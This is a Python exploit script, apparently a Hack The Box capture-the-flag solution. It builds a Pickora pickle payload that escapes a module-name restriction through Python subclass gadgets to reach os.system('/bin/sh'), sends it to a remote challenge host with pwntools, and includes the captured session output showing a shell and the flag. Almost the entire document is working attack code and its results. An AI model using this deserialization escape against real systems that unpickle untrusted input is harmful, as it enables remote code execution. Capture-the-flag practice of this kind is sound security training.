#!/usr/bin/env python3

from pickora import Compiler
from base64 import b64encode
import pwn

p = b'_setattr = GLOBAL("app", "__setattr__");'
p += b'subclasses = GLOBAL("app", "Phreaks.__class__.__base__.__subclasses__")();'
p += b'_setattr("subclasses", subclasses);'
p += b'gadget = GLOBAL("app", "subclasses.__getitem__")(84);'
p += b'_setattr("gadget", gadget);'
p += b'os = GLOBAL("app", "gadget.load_module")("os");'
p += b'_setattr("os", os);'
p += b'system = GLOBAL("app", "os.system")("/bin/sh");'

if __name__ == '__main__':

    payload = b64encode(Compiler().compile(p))

    io  = pwn.remote('94.237.62.117', 58520)
    sla = lambda x,y: io.sendlineafter(x, y)

    sla(b'> ', b'2')
    sla(b'data: ', payload)
    sla(b'> ', b'1')
    io.interactive()

'''
$ ./exploit.py
[+] Opening connection to 94.237.62.117 on port 58520: Done
[*] Switching to interactive mode
__main__ Phreaks
================ ==============
Hacker Handle    Skrill
================ ==============
Category         Rev
Id               5014

__main__ Phreaks
================ ==============
Hacker Handle    Alfredy
================ ==============
Category         Hardware
Id               1321

__main__ Phreaks
================ ==============
Hacker Handle    Suspicious
================ ==============
Category         Pwn
Id               7262

__main__ Phreaks
================ ==============
Hacker Handle    Queso
================ ==============
Category         Web
Id               6879

__main__ Phreaks
================ ==============
Hacker Handle    Stackos
================ ==============
Category         Blockchain
Id               3325

__main__ Phreaks
================ ==============
Hacker Handle    Lin
================ ==============
Category         Web
Id               6374

__main__ Phreaks
================ ==============
Hacker Handle    Almost Blood
================ ==============
Category         JIT
Id               7575

__main__ Phreaks
================ ==============
Hacker Handle    Fiasco
================ ==============
Category         Web
Id               775

__main__ Phreaks
================ ==============
Hacker Handle    Big Mac
================ ==============
Category         Web
Id               6642

__main__ Phreaks
================ ==============
Hacker Handle    Freda
================ ==============
Category         Forensics
Id               7796

__main__ Phreaks
================ ==============
Hacker Handle    Karamuse
================ ==============
Category         ML
Id               929

app __setattr__
app Phreaks.__class__.__base__.__subclasses__
app subclasses.__getitem__
app gadget.load_module
app os.system
$ id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
$ cat f*
HTB{Y0U_7h1nK_JUs7_ch3ck1n9_S0M3_m0DUL3_NAm3s_1s_3n0u9H_70_s70p_93771n9_Pwn3d??}
$ 
[*] Interrupted
[*] Closed connection to 94.237.62.117 port 58520
'''
